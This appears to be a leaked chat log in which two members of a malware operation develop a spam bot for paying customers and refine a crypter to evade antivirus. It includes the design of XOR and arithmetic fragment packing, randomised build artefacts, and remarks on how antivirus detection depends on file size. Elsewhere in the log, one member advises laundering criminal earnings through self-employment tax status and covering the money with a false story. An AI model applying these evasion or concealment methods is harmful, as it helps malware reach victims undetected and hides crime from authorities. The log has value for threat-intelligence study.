[27.07.21 17:05:16] basil: Greetings!
[27.07.21 17:05:27] elroy: Hello.
[27.07.21 17:05:57] basil: Still have strength left today or better already tomorrow?
[27.07.21 17:06:23] elroy: Still left, but it depends on what you need.)
[27.07.21 17:09:21] basil: Well, actually, what I feared periodically, that happened. This bot stopped working. And it stopped working very specifically (in my opinion). After being loaded into the 32-bit process it could write debug messages into the file but it failed to initialize MAPI. Can it be so if the system API call works?
[27.07.21 17:10:07] basil: by system API I mean e.g. write to file
[27.07.21 17:10:45] elroy: And what does loading into 32 bit process mean?
[27.07.21 17:11:22] elroy: 64dll->32hollowing ?
[27.07.21 17:11:35] basil: 32->64
[27.07.21 17:12:32] elroy: 32 -> 64 must load into 64 bit process. This process in task manager must not show up as 32 bit
[27.07.21 17:13:04] elroy: Yes, mapi may be not initialized for that reason. So it detects process bitness and if it's different it can crash or not initialize
[27.07.21 17:13:36] basil: ok. Thank you. I'll try another way.
[27.07.21 17:41:06] basil: thank you! My hand.
[27.07.21 17:41:24] basil: Sorry, I sat all day, nothing works.
[27.07.21 17:41:33] basil: Finally)))
[27.07.21 17:42:09] basil: Well, and cognac, I decided to afford it. For ever.....
[27.07.21 17:42:12] basil: cokes
[27.07.21 17:42:27] basil: It worked!
[27.07.21 17:54:11] elroy: So it turned out to be the cognac? Does it work?))
[27.07.21 17:54:27] basil: YES. You won't believe it!
[27.07.21 17:54:40] basil: That's some bullshit.
[27.07.21 17:54:42] basil: )))
[27.07.21 17:54:48] elroy: )))
[27.07.21 17:56:01] basil: No. I still thank you. But cognac a little bit. Get in my position....
[27.07.21 17:56:08] basil: You're welcome......
[27.07.21 17:56:22] basil: :cry:
[27.07.21 17:56:32] elroy: I don't mind.)
[27.07.21 17:56:35] basil: I'm not a drunk
[27.07.21 17:56:44] basil: Thank you
[27.07.21 17:57:25] elroy: May I ask, is the cognac for a joyful occasion or for another?
[27.07.21 18:00:44] basil: You may. The occasion is simple - I've already tried everything today...... Nothing worked. I mean at all...... Angry bastard...... Thought I'd write to you.....  Before I tried it I aggravated a little, a shot literally.... And you know..... Finally.
[27.07.21 18:01:03] basil: Sorry if I was wrong....
[27.07.21 18:01:23] basil: But I'm really grateful to you.... Although a little tipsy.
[27.07.21 18:01:36] elroy: I see))
[27.07.21 18:01:55] basil: Sorry, if I was wrong.
[27.07.21 18:02:31] elroy: That's okay.)
[27.07.21 18:02:39] basil: ok.
[03.08.21 09:41:25] basil: Greetings.  There are some nuances in my work. They have to do with the schedule. I'll be online for a week to two weeks now somewhere from 12:20-13:00 MSC and in the evening from 17:20 until the end. Just so you know.
[03.08.21 09:42:02] elroy: Greetings.
[03.08.21 09:42:20] elroy: Thanks for letting me know, but it's not very good...
[03.08.21 09:42:39] elroy: And these two weeks can you devote time to work?
[03.08.21 09:43:11] basil: of course.... But I just can't get online.
[03.08.21 09:43:39] elroy: may I ask why?)
[03.08.21 09:44:20] basil: absolutely
[03.08.21 09:44:25] basil: now
[03.08.21 09:45:09] basil: listen, can you drop me a link to a site Where there are one-time messages?
[03.08.21 09:45:15] basil: you trust
[03.08.21 09:45:39] elroy: Not that site, I trust pgp
[03.08.21 09:46:24] elroy: Or text document, archived under strong password, and on qaz
[03.08.21 09:46:36] basil: ok.
[03.08.21 09:56:42] basil: Jk6I82u#pOgikmQ8ttbDMW}r#VIVu2%tO}{IzV%L1cV9n5|kY6
[03.08.21 09:57:29] basil: https://file.io/BzFZE8kYAPFr
[03.08.21 09:57:43] basil: after reading it, burn it
[03.08.21 09:57:49] elroy: jefferson asked me to tell you:
```
 can you tell basil, when he shows up, to use my server (I gave him access), he should contact fox@ so he can prepare virtual machines for tests every time? I need to go away
the contact is in the toad, not here

Other times I have passed my servers to coders and then they ran tests not on virtual machines, but on the host itself, which of course should not be done
```
[03.08.21 09:57:58] elroy: Okay, I'll burn it
[03.08.21 10:01:40] elroy: Burned
[03.08.21 10:01:57] basil: ok. thanks.
[03.08.21 10:02:27] elroy: You got a total shutdown there, no phones, no modems, no wifi ?
[03.08.21 10:04:24] basil: if it were possible I would love to. Scared myself yesterday.... There's a whole bunch of chatter in the chat room. And I am not. I'm not very pleasant to listen to it either.
[03.08.21 10:04:32] basil: and I can't do anything yet
[03.08.21 10:06:34] elroy: Need to report such a schedule silver, today frances gave out the beating
```
Guys, why are half of the chat during working hours for the second day absent? Remotely means that you will be working from home, but at the right time everyone must be in touch, especially during daytime working hours. I'll start checking and penalizing.
```
[03.08.21 10:07:16] basil: Silver already put in today. But so.... Light version.
[03.08.21 10:07:28] basil: I discussed the matter with him
[03.08.21 10:07:38] basil: he nodded his head so far
[03.08.21 10:07:50] elroy: Oh, all right, then.
[03.08.21 10:07:59] elroy: Then don't delay your work.)
[03.08.21 10:08:08] basil: Okay. Thanks.
[03.08.21 10:08:21] elroy: Another customer is waiting, I asked him today
[03.08.21 10:08:37] elroy: And keep in mind what I threw in there about the server from jefferson
[03.08.21 10:08:56] basil: Okay.
[03.08.21 18:34:26] elroy: In place?
[03.08.21 18:43:09] basil: yeah.
[03.08.21 18:44:09] elroy: jefferson asked to make sure that the server did not have to activate each bot one by one. If he loads 2 thousand bots, it is not convenient.
[03.08.21 18:44:15] elroy: martin did
[03.08.21 18:44:25] elroy: Check it please
[03.08.21 18:44:30] elroy: ``
added an allow work button, which allows all connected bots to work
```
[03.08.21 18:44:45] elroy: If it works, tell jefferson
[03.08.21 18:45:09] basil: I'm for sure.... But I don't see such a button
[03.08.21 18:45:34] elroy: Re-login and press ctrl+f5 there
[03.08.21 18:45:39] elroy: The cache will reset
[03.08.21 18:45:45] elroy: look for shortcut button))
[03.08.21 18:45:52] basil: Okay.
[03.08.21 19:24:10] basil: button found)))
[03.08.21 19:24:37] elroy: Where was it?
[03.08.21 19:24:59] elroy: Still gotta check if it works
[03.08.21 19:25:02] basil: tab bots
[03.08.21 19:25:27] basil: in the section with the list of bots. Top left
[03.08.21 19:25:40] elroy: In a prominent place))
[03.08.21 19:26:24] basil: never would have thought it was a button..... It's more like an inscription.
[03.08.21 19:26:29] basil: framed
[03.08.21 19:27:21] basil: here's more .... The bot worked
[03.08.21 19:27:33] elroy: Why didn't it work?
[03.08.21 19:27:44] basil: there are several reasons
[03.08.21 19:31:11] basil: I tried to get the head of servers to give me a free server, but somehow it did not work.... Then I made my own, repeated what the server sends, connected through localhost. All tested, it worked. But here it turned out that the server sends all narmalnom (my homemade server), and checks the authorization of the bot, I did not do. Here..... And in consequence, did not notice how in the code commented out the initialization of the ID bot
[03.08.21 19:31:20] basil: Plus
[03.08.21 19:33:44] basil: They didn't have any accounts for Outlook on the server there. If they wanted to, outlook wouldn't send anything. I looked at the logs, there were only MAPI errors. I thought, hello again((((( Now there's this.... And then I decided to see if there were any emails in the repository..... And I see that not a single account
[03.08.21 19:34:23] elroy: Oh, well, that's why it was shutting down.
[03.08.21 19:34:36] basil: Yeah.
[03.08.21 19:35:12] elroy: Good news, in general)
[03.08.21 19:35:33] elroy: Glad everything works.
[03.08.21 19:35:43] elroy: does jefferson know? Let him know.
[03.08.21 19:35:54] basil: Yes.
[03.08.21 19:35:57] elroy: And I have to give the second build to the customer.
[03.08.21 19:37:01] basil: The only thing there is that sometimes outlook sends emails and sometimes not. But it depends on the particular build of the office
[03.08.21 19:37:12] basil: Remember it happened?
[03.08.21 19:37:19] elroy: Yes, I remember
[03.08.21 19:37:24] elroy: There was such a joint
[03.08.21 19:37:35] elroy: To localize the cause
[03.08.21 19:37:54] elroy: Second customer will work with dll
[03.08.21 19:37:57] basil: I'm already doing it
[03.08.21 19:38:04] elroy: Okay.
[03.08.21 19:38:07] basil: loco
[03.08.21 19:38:18] basil: dll will also do
[03.08.21 19:38:27] elroy: Not yet?
[03.08.21 19:38:27] basil: on AV xbcnj
[03.08.21 19:38:29] basil: clear
[03.08.21 19:38:59] basil: yes. I will build, I will give.
[03.08.21 19:39:26] elroy: There's only a different server and gaskets needed... Do you remember the server?
[03.08.21 19:39:43] basil: Honestly, no
[03.08.21 19:39:52] elroy: A moment.
[03.08.21 19:41:48] elroy: Tell me, are you ready to give out a build, there are only pads left?
[03.08.21 19:42:05] elroy: It's about the second customer
[03.08.21 19:42:26] basil: Now.
[03.08.21 19:43:17] basil: now I'll try to assemble
[03.08.21 19:44:53] basil: well, the dll was built. But to be honest I haven't tested it and didn't check it with dyncheck
[03.08.21 19:45:36] basil: but that's the same, only the dll
[03.08.21 19:46:06] elroy: Make it a priority, and then localize the non-send phenomenon
[03.08.21 19:46:27] elroy: Just build/test and give away
[03.08.21 19:46:44] elroy: He wrote to silver today
[03.08.21 19:46:55] basil: ok
[03.08.21 19:47:34] elroy: The server seems to be down
[03.08.21 19:48:19] elroy: I'll have to do a release, then notify him, order him a server... then pads and bot build
[03.08.21 19:48:59] basil: ok. then i'll do the dll
[03.08.21 19:49:06] elroy: ok.
[03.08.21 19:49:21] elroy: everything ready for jefferson?
[03.08.21 19:50:10] basil: at least for now I don't see any more errors
[03.08.21 19:50:15] basil: I notified him
[03.08.21 19:50:25] elroy: fine)
[03.08.21 19:50:34] basil: smtp works too
[03.08.21 19:50:48] elroy: I hope so. Because it did work))
[04.08.21 09:44:27] basil: hello!
[04.08.21 09:44:53] elroy: Greetings.
[04.08.21 09:46:13] basil: Please remind me what the second customer wants from the bot in DLL form. All the same requirements only in DLL form?
[04.08.21 09:46:23] elroy: Yes
[04.08.21 09:47:32] basil: Okay. I did the build. It's relatively clean.
https://dyncheck.com/scan/id/b8db72a2b6c2a7c500838ee027747fb5
I'll test it today or tomorrow and it will be ready.
[04.08.21 09:48:18] elroy: Okay, it's clean, not relatively.
[04.08.21 09:48:35] elroy: webroot does not count, need to be excluded from scanning
[04.08.21 09:48:48] basil: ok. ok.
[09.08.21 09:22:11] elroy: hello
[09.08.21 09:22:30] basil: hello!
[09.08.21 09:22:49] elroy: How are you getting on with releasing version as dll ?
[09.08.21 09:23:42] basil: it worked so far. I tested it. everything seems fine. When I run an exported function it works fine
[09.08.21 09:23:51] basil: who to pass the dll to
[09.08.21 09:23:59] basil: that's the first question
[09.08.21 09:24:03] basil: and the second
[09.08.21 09:24:57] basil: what should be the name and signature of the exported function that makes the bot work?
[09.08.21 09:25:25] basil: because I just called it "Start" so far
[09.08.21 09:26:59] elroy: It should be of that prototype, that cesar uploaded.
[09.08.21 09:27:21] elroy: But the thing is, he's redoing the bot now, I don't know what will stay there.
[09.08.21 09:27:34] elroy: jefferson asked for dll ?
[09.08.21 09:29:33] basil: not yet. On Friday, I still suggested him to jointly test the bot, so he made sure everything works. He said he would be free later tonight, but then wrote, "Don't wait up for me, I'm going to be a long time today. Tried to catch him at the weekend but I couldn't find him online.
[09.08.21 09:30:20] elroy: Okay. The thing here is that martin went on vacation. And there is no one to deploy the server for the customer.
[09.08.21 09:30:26] elroy: Probably gone for two weeks.
[09.08.21 09:30:35] elroy: That's it.
[09.08.21 09:30:59] elroy: I'll ask to put off spambot for now, except for jeffreson's tasks, if he needs anything
[09.08.21 09:31:14] elroy: I'll check about the server the other day.
[09.08.21 09:31:32] elroy: I need to improve arithmetic packer
[09.08.21 09:31:39] basil: Yes, I'm listening
[09.08.21 09:31:59] elroy: We have a problem with it in that it packs a lot.
[09.08.21 09:32:11] elroy: So there's this idea, pack 60% of the file
[09.08.21 09:32:27] elroy: And 40% just run under xor
[09.08.21 09:33:13] basil: i.e. we have to split the load somehow and then connect it. These are the points to redo
[09.08.21 09:34:17] elroy: But the idea is a bit broader, you need to pack a random number of fragments in a row, then do xor with another random number, then arithmetic again, i.e. alternate, but alternate so that 60% (approximately) are packed with arithmetic.
In addition I also thought, we should change the xor key for each following fragment
[09.08.21 09:35:14] basil: i.e. it's necessary to have variable number of fragments?
[09.08.21 09:36:01] basil: And how will we later place them into the crypter code itself?
[09.08.21 09:38:20] elroy: Exactly the same way as we do now. Yes, you have to have a variable number of fragments.
I thought it's easier to base it on arithmetic packer class to make a class with this partial packer.
Arithmetic packer stores sequences of fragments, i.e. information about fragments, right? You can do a fragment sampling there
[09.08.21 09:39:01] basil: I get your idea
[09.08.21 09:39:33] elroy: It's also important to have a random sequence of fragments so that the sets of fragments differ from build to build
[09.08.21 09:40:06] basil: i.e. in one buffer (load file data block) we alternately encrypt with xor and arithmetic compressor. Is it right?
[09.08.21 09:40:22] elroy: Yes
[09.08.21 09:40:58] basil: Okay.
[09.08.21 09:41:01] basil: I got it.
[09.08.21 09:42:59] basil: are fragment sizes, number and sequence (xor-arithmetic compression) limited somehow, or should they be adjustable in some way?
[09.08.21 09:43:16] basil: somehow
[09.08.21 09:44:09] elroy: Adjustable by constants... It's not a matter of principle, do as close as possible to what's now in the compressor class (to redo less)
[09.08.21 09:45:09] basil: ok. I think it will take a week. Maybe less. This timing suit you ?
[09.08.21 09:45:52] elroy: A week is a lot. Try 3 days.
[09.08.21 09:46:17] elroy: Make it as simple as possible, the main thing is to realize the idea.
[09.08.21 09:46:28] basil: ok. I will.
[09.08.21 09:47:16] elroy: I've got news about cryptor, now there's no way to generate working cryptor by itself.
[09.08.21 09:48:04] elroy: To generate workable, you have to put develop into any branch, for example develop_payload_generic, it will build workable generic
[09.08.21 09:48:27] elroy: UniCrypter stub is built, it builds itself, you don't need to change anything for that
[09.08.21 09:49:24] elroy: As always, please do in a separate branch, based on the develop branch, I will put in later. Just may be more changes in functionality
[09.08.21 09:50:10] basil: Okay. One more time. I'm making a separate branch from develop and working in it
[09.08.21 09:50:17] basil: ?
[09.08.21 09:50:23] basil: not from others
[09.08.21 09:51:07] elroy: Yes, right. But if you need to test, pour into any branch at your local and test, but don't pour that test branch
[09.08.21 09:51:25] basil: okay. got it now
[09.08.21 15:14:53] elroy: in place?
[09.08.21 15:15:17] basil: say that again.
[09.08.21 15:15:26] basil: test
[09.08.21 15:15:30] basil: that's better
[09.08.21 15:15:33] basil: repeat
[09.08.21 15:16:11] elroy: I asked if you were there. I got an answer.)
Forgot something about refining the arithmetic packer
[09.08.21 15:16:23] basil: Yes, I'm listening
[09.08.21 15:17:05] elroy: It's not strictly 60%. I want random percentage, range from 55 - 70%.
[09.08.21 15:17:22] basil: ok
[09.08.21 15:17:25] basil: I got it
[09.08.21 15:18:14] elroy: Okay. I need it to build one file with different size)
[09.08.21 15:18:30] elroy: I've stumbled upon the fact that our detection depends on file size load)
[09.08.21 15:18:45] basil: Wait
[09.08.21 15:18:48] basil: more
[09.08.21 15:18:51] basil: how?
[09.08.21 15:19:16] elroy: It seems to affect the offset or something
[09.08.21 15:19:46] elroy: If you pack 70 kb and 140 kb into a load, one file will have a detector, the other will not
[09.08.21 15:19:53] elroy: Such a surprise
[09.08.21 15:20:01] elroy: (this is for example)
[09.08.21 15:20:32] basil: Maybe it just glows in the data
[09.08.21 15:20:37] basil: lit
[09.08.21 15:20:43] basil: something
[09.08.21 15:20:49] elroy: Exactly tested on shellcode. Test 1kb, and manuellcrypted 256kb, got detected in one case)
[09.08.21 15:21:28] basil: your wishes I will of course. But it's very strange.
[09.08.21 15:21:40] elroy: AB's static by offset is crooked there, probably statics is set automatically)
[09.08.21 15:22:09] elroy: We also have noise code being generated, it dilutes the size
[09.08.21 15:22:24] elroy: Sometimes it helps just to make 10 builds, and one will be clean for sure
[09.08.21 15:22:44] basil: Okay. Alright. I will do
[09.08.21 15:23:07] basil: although, I wasn't expecting that at all
[09.08.21 15:24:32] elroy: For example, my guys' cryptors collect the same load. I.e. make 100 builds for one and the same load and you'll get 100 files up to 1 Kb identical) That's AV and catch them by size)
[09.08.21 15:24:55] elroy: And we have slightly better with it, but few, sections have almost the same size))
[09.08.21 15:25:46] basil: isn't that a variant using fuzzy hashes by any chance
[09.08.21 15:25:48] basil: ?
[09.08.21 15:25:57] elroy: this is very similar
[09.08.21 15:26:02] basil: Looks like the wind is blowing from that direction
[09.08.21 15:26:14] elroy: Maybe there's a fuzzy hash on a code fragment, not on the whole section
[09.08.21 15:27:15] basil: ok. we'll take it into account.
[09.08.21 15:28:30] elroy: Recently they added a feature for morning builds. In the morning the load is crypted and sent to check. You can check out our cryptor, it's holding its positions)))
[09.08.21 15:28:59] basil: there's a link?
[09.08.21 15:29:36] elroy: There's an Auto test button on top of the panel
[09.08.21 15:29:43] basil: a moment
[09.08.21 15:32:04] basil: what a progress!)))
[09.08.21 15:32:27] basil: it sure is nice)))
[09.08.21 15:32:37] elroy: if only he could clean himself))))
[09.08.21 15:34:39] basil: I also thought about it. Is it possible to atomize.... Or at least partially automate.... But so far only thought about how to automate the "points" of detection.... Codogeneration, which would remove this detection, probably can be realized
[09.08.21 15:34:46] basil: it will
[09.08.21 15:35:06] basil: maybe it's for the best .... There will be work
[09.08.21 15:36:00] basil: Look, you said I could contact you about production issues
[09.08.21 15:36:13] basil: Can we discuss now? Are you up to it?
[09.08.21 15:37:25] elroy: Yes, of course we can.
[09.08.21 15:38:41] basil: The question is, in general, complex. You can't look at it from one side... I'll type it in my notebook and send it to you. So the text doesn't get lost.
[09.08.21 15:39:31] elroy: Okay.
[09.08.21 15:57:16] basil: test
[09.08.21 15:57:24] elroy: Stand by
[09.08.21 15:58:29] basil: First of all I will make archiver you said to make, of course. No problem. And I even think that the deadline will be met. But here's something I'd like to discuss... First with you, as a "direct superior. Let's call your position that. Now as you can see I can not be online all day. I can work, I took the VM with me, and that's it. Why so - you asked me. I sent you a file with the answers to this question. But unfortunately the situation drags on. Today I asked the guys on the real job. Well, when, well, when? I tried to motivate them by the fact, that we need to look for information, we need all sorts of libraries and so on. I was told that the freebie ended and when it will be again - no one knows. So I have a question for you. Is it possible to leave my current schedule (appearing online) as it is now. Provided, of course, that the work will be done. This is the first question. And at the moment it is the most important.
The second question. I want to change my official job. An official job is needed. Because.... I don't know about you, but I might have questions. What do you live on if you don't work anywhere? Plus the IRS might ask, "Where's the firewood coming from?" That's why I'm actively looking for a new place. A remote one, of course. One that allows you to be online and have official proof of income. So. The question is whether you could consult me about all sorts of test assignments. This, of course, is not a panacea. Everyone looks at the code differently and so on. But the chance of getting this job will be higher.
[09.08.21 16:11:03] elroy: I will advise you in any way I can. No problem. But everyone dances in their own way, who wants what they come up with.
I can not help with the search for white work, once it was a long time ago, myself worked long ago... I realized for myself that the white work is not so good, if you do not bring the company a very good return.
I suggest you do an analysis of your interview (just to help). Comments on your case with the tz:
1) not everything worked right away
2) there was no explanation.
3) you need /MT flags everywhere in the projects.
4) clean legible code is important
(that's why it was decided to ask questions)
In a conversation never ask you not to insult, etc., treat with respect, etc. - this is clear and without explanation.

About tax and white collar jobs, is that the only problem? The fact is that today there is a small vulnerability in the law - self-employment. A self-employed person is an individual who pays taxes. Up to 2.4 million a year. 4% tax.
1. no problem with the transfers, you can refer to the fact that so paid the customer, who knew he was a jerk, he threw the crypto chuurez exchanger... ...and said he did not expect it.
2. the money becomes officially earned after you pay the tax.
3. no one can verify you without a complaint against you from the consumer (who does not exist)
4. of course not a virus and crypto writing official, there should be a excuse (just in case)
5. taxation does not require to identify individual customers, only legal entities, with whom they will not work.
[09.08.21 16:12:57] elroy: I stressed the "physical" why, you have the right not to open the door to anyone at all (officially) - the inviolability of housing.
[09.08.21 16:14:46] basil: a moment
[09.08.21 16:16:11] basil: Yes, about the tax office - this is the first moment
[09.08.21 16:19:54] basil: The second point. I've been here about a year and a half. If I'm not mistaken... Once the Chief, wrote that "if the defender is not clean - this job is not for you. I guess, of course, that this is just a preventive kick, just so that really did not go to sleep, but somehow a little scary. You do not have that feeling?
[09.08.21 16:24:00] elroy: No, I don't have that feeling. It's like that at any job. The place that told me that paid me 3.5k rubles/month. I spat and got off the job market)). The salaries here are different, are you sure you can offer the appropriate performance in the white market? According to my observations you do not work very fast. I'm blackmailing you about it, look for another job, etc., because no one is pressuring, not particularly demanding. Well, I kind of let it pass me by.
Usually a coder output should be 500 lines per day (not much and not little), but for this pay 1-2 thousand bucks a month.
[09.08.21 16:24:53] elroy: *I'm NOT blackmailing you about this
[09.08.21 16:25:26] basil: yes. the arguments are logical.
[09.08.21 16:25:53] basil: I don't even know what to object.....
[09.08.21 16:26:35] elroy: About your schedule, I need output. Your results are fine with me.
[09.08.21 16:26:55] elroy: Well you can't be in touch yet, I won't mind, be at lunchtime and in the evenings
[09.08.21 16:27:04] elroy: Maybe then something will change
[09.08.21 16:27:11] elroy: Anything happens...
[09.08.21 16:27:45] basil: I got a fever all over my body... It's like a lightness.
[09.08.21 16:27:48] basil: )))
[09.08.21 16:28:57] elroy: Are you a full-time employee? 2k salary? I was talking to silver about your full transfer (I thought you were part-time). He was not against it, I even persuaded him to offer you full-time))
[09.08.21 16:29:22] elroy: The only thing I was interested in was a full-time transfer. That is, not to be spread over two jobs.
[09.08.21 16:29:43] basil: Well, yeah, 2k salary
[09.08.21 16:29:53] basil: That's the current salary
[09.08.21 16:30:16] basil: Since we're having this conversation
[09.08.21 16:30:41] basil: you think I'm slow?
[09.08.21 16:31:39] elroy: Nothing personal, I see that you try... But yes, slow. It was like that before, just got used to (I'm telling you, thought you were half the time).
[09.08.21 16:32:31] basil: ok. the arguments are clear. And fair. I don't even have anything to object to.
[09.08.21 16:32:34] basil: Yeah...
[09.08.21 16:33:42] basil: Okay. Let me do what you told me to do. We'll talk again in a week or two. Thanks
[09.08.21 16:33:49] basil: It's all business.
[09.08.21 16:34:00] elroy: Okay, no problem.)
[09.08.21 16:34:08] elroy: About the internet
[09.08.21 16:34:24] elroy: Maybe look for options to access it?
[09.08.21 16:35:46] elroy: I don't know how some people have any difficulties at all. If the airwaves aren't monitored, you could look for good options via bluetooth, it has a kilometer option. Or something else wireless. Someone can put a radio bridge (as luck would have it).
[09.08.21 16:36:17] basil: More details.
[09.08.21 16:36:22] basil: May I?
[09.08.21 16:36:33] elroy: I can. And what exactly?
[09.08.21 16:36:57] basil: about radio options.
[09.08.21 16:42:22] elroy: You need to google kilometer bluetooth. You need two devices, one inside and one outside. Usually a bluetooth speed channel is enough if you're not pulling heavy weights. - is the first option.
wifi - two things are interesting, there are powerful directional and non-directional access points, for example to mikrotik, ubiquity, there you can, depending on the availability of line of sight to do. Again, you need either two devices, or one directed to the cafe, for example, where open wifi and high sensitivity.
In addition to wifi protocol such points have their own. If the two are the same, you can't see them as wifi devices.
There are other options is the mobile Internet via a modem (sim card and go)
There are satellite options, two-way, costs money of course, it is necessary to look at them, they have good speed, costs about 3-5 thousand / month, covering Europe, Russia.
There are pirates on alike different whistles in the range of 2.4, they are fashionable to bridge (they're like for arduino and similar).
[09.08.21 16:44:09] basil: ok. I will check these options, maybe something can be done.... About bluetooth I heard for the first time, frankly speaking....
[09.08.21 16:44:23] basil: But thanks for understanding anyway.
[09.08.21 16:44:36] basil: And the explanation.
[09.08.21 16:44:56] elroy: Old Nokia smartphones (simbian) had this feature, 300-500 meters was real, two phones were communicating
[09.08.21 16:46:10] elroy: You can also see zeegbe)
[09.08.21 16:46:21] basil: ok. thanks. I got it. The meeting was constructive. I'm still going to redo this compressor. Do you have any questions for me?
[09.08.21 16:46:33] elroy: No)
[09.08.21 16:46:57] basil: ok.
[11.08.21 16:03:20] elroy: Greetings.
[11.08.21 16:03:30] basil: Hello.
[11.08.21 16:03:40] elroy: Any luck with arithmetic bagger problem?
[11.08.21 16:05:49] basil: yes. but at the moment not completely. Individually it all works, but when I try to combine them, one piece of data with one packer and another with another, it still crashes. Basically I already fixed the error for one of the packers. The second is still in the process
[11.08.21 16:06:15] elroy: Good
[11.08.21 16:07:53] elroy: I remembered about LoRa, I tested it once. Funny thing, the speed is low, but the range in line of sight up to 15 km, a pair of modules costs 20 + 20 bucks.
[11.08.21 16:08:25] basil: ok. Wait, the customer.
[11.08.21 16:09:44] basil: it turns out it lost files
[11.08.21 16:09:45] basil: )))
[11.08.21 16:09:48] basil: he
[11.08.21 16:10:23] basil: thanks for the advice
[11.08.21 16:10:47] elroy: Ah, it happens.)
[11.08.21 16:31:40] basil: good news. It's working. I'm combing code.
[11.08.21 16:32:20] elroy: Good news indeed.)
[11.08.21 16:32:41] elroy: Yeah, make it as readable as possible.
[11.08.21 16:33:15] basil: yes. there is such a problem. I'll do my best.
[11.08.21 16:33:24] elroy: Has your final crypt size decreased?
[11.08.21 16:33:55] basil: yes. It'll probably be bigger.
[11.08.21 16:34:10] basil: Yeah, no. Still.
[11.08.21 16:34:36] elroy: Wait, but it's supposed to go down, even in theory
[11.08.21 16:35:28] elroy: I mean the final scripted file, not the source code
[11.08.21 16:37:20] basil: okay. let's discuss again. Your goal was to break the file up into a bunch of blocks, 60% compressed arithmetically and 40% xor compressed. Right?
[11.08.21 16:37:33] elroy: Yes
[11.08.21 16:41:39] basil: now look, each block is either xor or arithmetic compressed. At that each block stores in its body a "descriptor" (the descriptor stores in either xor prickle or frequency distribution for occurring symbols (for arithmetic compression)). And each block has its own descriptor
[11.08.21 16:42:48] elroy: Reduce key size to 1/5 block size, for xor case
[11.08.21 16:42:49] basil: It's supposed to increase size
[11.08.21 16:43:03] basil: no problem for xor
[11.08.21 16:43:50] basil: but for arithmetic compression such trick may not work. Or you should store only nonzero frequency distributions
[11.08.21 16:44:32] elroy: Just reduce key for xor, for arithmetic leave it as it is. There used to be frequency allocation for block too, didn't there?
[11.08.21 16:44:44] basil: yes.
[11.08.21 16:45:11] basil: but blocks have to be big, at least 10kb
[11.08.21 16:45:33] elroy: Then it should decrease, in theory. After all, taking into account frequency of key distribution, size of data was 5 times bigger than load size (approximately)
[11.08.21 16:45:45] elroy: Okay, berry big.
[11.08.21 16:46:10] elroy: Just make key size smaller, 128 bytes, that's enough
[11.08.21 16:46:54] basil: ok. If the block will be small, no sense, most of the data will occupy the descriptor
[11.08.21 16:47:17] elroy: Ok, I agree.
[11.08.21 16:49:22] elroy: * with the distribution frequencies
(I wrote something wrong...)
[11.08.21 16:50:04] basil: I once said phase difference between frequencies)))
[11.08.21 16:50:12] elroy: There seems to be 40 frequency bytes per 8 bytes of data
[11.08.21 16:50:43] elroy: deep thought)))
[11.08.21 16:50:59] basil: strongly said!
[11.08.21 16:51:09] elroy: can't argue))
[12.08.21 09:30:59] basil: greetings!
[12.08.21 09:33:03] elroy: Hello!
[12.08.21 09:34:30] basil: Well, it looks like it's done. I've tested the packer-unpacker. Developed in a separate branch. Tell me where to put it now?
[12.08.21 09:34:49] basil: Did you get the message?
[12.08.21 09:35:05] elroy: ``
 Well, I think the whole thing is ready. I'm packing - unpacking tested. Developed in a separate branch. Tell me where to put it now?
Did you get the message?
```
[12.08.21 09:35:15] basil: ok.
[12.08.21 09:35:46] elroy: I'll look at it, and if everything is okay, I'll upload it myself. Thank you.
[12.08.21 09:36:14] basil: can you talk now, or are you busy?
[12.08.21 09:37:09] elroy: Busy, but I can talk) Tell me about it.)
[12.08.21 09:38:44] basil: ok. there are 3 different cryptors in the solution. I added the pack itself to SolutionBuilder. It's fine. And in which crypter should I add unpacking? Or to all of them?
[12.08.21 09:39:55] elroy: No, not all. Add it to UniCrypter, next to arithmetic.
[12.08.21 09:41:03] elroy: File UniCrypter.cpp, UniCrypter.build.cpp is its copy, it is generated with every build based on UniCrypter.cpp
[12.08.21 09:41:45] basil: ok. Now the customer wrote. Said for the moment everything is fine
[12.08.21 09:41:53] basil: By spam bot
[12.08.21 09:42:03] elroy: Congratulations. It happens))
[12.08.21 09:42:19] basil: Okay.) Don't make fun of me.
[12.08.21 09:42:21] elroy: (customers don't often write about such things)
[12.08.21 09:43:01] basil: I won't interrupt any more
[12.08.21 14:44:47] elroy: Tell me, have you updated UniCrypter.cpp yet?
[12.08.21 14:45:14] elroy: Tell me, have you updated UniCrypter.cpp yet?
[12.08.21 14:46:21] basil: no. now sorry, it's a communication session. Later.
[12.08.21 15:31:57] basil: listening
[12.08.21 15:32:09] basil: no, not updated. I'll remind you again.
[12.08.21 15:48:55] basil: I didn't say anything bad? No offence?
[12.08.21 15:55:04] elroy: I didn't. I just didn't get the point.
[12.08.21 15:55:26] elroy: UniCrypter.cpp when will you do it?)
[12.08.21 15:56:23] basil: I'm doing it now. Tell me, there are viral methods in the code. I can see the names of classes , just like spam-bot?
[12.08.21 15:57:01] elroy: In the code it is better to get rid of the class
[12.08.21 15:57:18] elroy: Just change from build to build
[12.08.21 15:57:42] basil: ok.
[12.08.21 16:26:47] basil: Done. All poured.
[12.08.21 16:28:11] elroy: Is it working?
[12.08.21 16:29:01] basil: now. Tell me, what build command to build UniCrypter
[12.08.21 16:29:37] elroy: build -s c:\temp -p c:\temp\helloworld.exe
[13.08.21 07:40:53] basil: Hello.
[08.13.21 07:41:06] elroy: Hello.
[08/13/1921 07:41:45] basil: Anyway, my cryptor's working. I've made changes. Checked it. Everything seems to be fine. You can use
[13.08.21 07:46:54] elroy: Okay. Thank you. Today is Friday after all. For some reason, these tasks seem easier to me. Maybe they are... In any case, thank you.)
Are you in touch today?)
[08/13/1921 07:48:32] basil: I'll be around till about 1:00 PM MSC. Then in the evening from 17:20 MSC. If something happens and there are some comments-suggestions.
[13.08.21 07:49:12] basil: Yes, that's another thing that classes are used there. Made there random generation of their names so they won't shine
[13.08.21 07:49:34] elroy: I wonder, I'll take a look.
[13.08.21 07:49:54] basil: ok. ok.
[08/13/21 08:32:03] basil: Listen, you said you could help-consult on a test assignment, if they send it to me. They just sent me one right now. Can you look at and describe how to do it, at least in broad strokes?
[13.08.21 08:34:15] elroy: Go ahead and take a look.
[13.08.21 08:34:27] elroy: * let's see
[13.08.21 08:34:44] basil: a moment
[13.08.21 08:35:32] basil: Implement a small key-value database

There is a server that listens for requests on the specified IP:PORT
The internal storage of the server is one boost::multi_index, which is stored in a file mapped to RAM
The key is of type String (maximum length 1024 characters)
Value has type - String (maximum length 1024 * 1024 symbols)

The database supports operations
    INSERT - add key:value
    UPDATE - change key:value
    DELETE - remove key
    GET - get value by key
